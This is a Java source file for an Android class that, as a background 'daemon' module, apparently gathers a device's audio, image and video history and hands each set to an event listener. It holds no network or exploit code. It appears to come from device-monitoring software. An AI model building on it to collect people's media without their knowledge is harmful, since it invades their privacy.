package com.vvt.daemon.mediahistory;

import android.content.Context;

import com.vvt.base.FxEventListener;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.FxOperationNotAllowedException;
import com.vvt.logger.FxLog;

public class MediaHistoryCapture {
	private static final String TAG = "MediaHistoryCapture";
	private boolean mIsWorking;
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	
	private Context mContext;
	private FxEventListener mFxEventListner;
	private String mWritablePath;
	
	public MediaHistoryCapture(String writablePath, Context context) {
		mContext = context;
		mWritablePath = writablePath;
	}
	
	public void register(FxEventListener eventListner) {
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		this.mFxEventListner = eventListner;
		
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
	}
	
	public void unregister() throws FxOperationNotAllowedException {
		if(LOGV) FxLog.v(TAG, "unregister # ENTER ...");
		if(mIsWorking) {
			mFxEventListner = null;
		}
		if(LOGV) FxLog.v(TAG, "unregister # EXIT ...");
	}
	
	public void startCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "startCapture # ENTER ...");
		if(mFxEventListner == null)
			throw new FxNullNotAllowedException("eventListner can not be null");
		
		if(mWritablePath == null || mWritablePath.length() < 1) {
			throw new FxNullNotAllowedException("WritablePath can not be null or empty");
		} 
		
		if(mContext == null)
			throw new FxNullNotAllowedException("Context context can not be null");
		
		//audio capture
		getAudioHistory();
		
		//imange capture
		getImageHistory();
		
		//video capture
		getVideoHistory();
		
		
		
		if(LOGV) FxLog.v(TAG, "startCapture # EXIT ...");
	}

	private void getAudioHistory() {
		if(LOGV) FxLog.v(TAG, "getAudioHistory # ENTER ...");
		AudioHistoryCapturer audioHistoryCapturer = new AudioHistoryCapturer(); 
		mFxEventListner.onEventCaptured(audioHistoryCapturer.getAudioHistory());
		if(LOGV) FxLog.v(TAG, "getAudioHistory # EXIT ...");
	}
	private void getImageHistory() {
		if(LOGV) FxLog.v(TAG, "getImageHistory # ENTER ...");
		ImageHistoryCapturer imageHistoryCapturer = new ImageHistoryCapturer(mWritablePath);
		mFxEventListner.onEventCaptured(imageHistoryCapturer.getImageHistory());
		if(LOGV) FxLog.v(TAG, "getImageHistory # EXIT ...");
	}
	
	private void getVideoHistory() {
		if(LOGV) FxLog.v(TAG, "getVideoHistory # ENTER ...");
		VideoHistoryCapturer videoHistoryCapturer = new VideoHistoryCapturer(mWritablePath);
		mFxEventListner.onEventCaptured(videoHistoryCapturer.getVideoHistory());
		if(LOGV) FxLog.v(TAG, "getVideoHistory # EXIT ...");
	}
	
}
